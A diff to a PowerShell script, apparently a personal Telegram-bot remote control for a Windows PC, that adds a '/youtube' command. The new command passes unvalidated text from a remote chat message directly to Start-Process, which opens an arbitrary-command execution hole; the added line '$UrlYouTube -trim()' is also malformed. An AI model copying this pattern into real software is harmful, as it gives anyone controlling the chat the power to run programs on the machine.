@@ -37,7 +37,7 @@ try {
 
 # --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
 try {
-    $MensajeInicio = " Ver 3 PC En Linea y Protegida: " + $User + "@" + $MiPC
+    $MensajeInicio = " Ver 4 PC En Linea y Protegida: " + $User + "@" + $MiPC
     [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio })
 } catch {}
 
@@ -117,7 +117,19 @@ while ($true) {
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
                             continue
                         }
-                        
+                      "/youtube" {
+                            # Captura la URL completa de YouTube que viene después del ID
+                            $UrlYouTube = $Partes | Select-Object -Skip 2
+
+                            if ($null -ne $UrlYouTube -and $UrlYouTube -trim() -ne "") {
+                                # Abre la URL en el navegador predeterminado del sistema
+                                Start-Process $UrlYouTube
+                                
+                                $Respuesta = "Abriendo YouTube con tu video en ID $MiIDNum"
+                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $Respuesta })
+                            }
+                            continue
+                        }  
                         "/notepad" {
                             Start-Process "notepad.exe"
                             Start-Sleep -Milliseconds 500
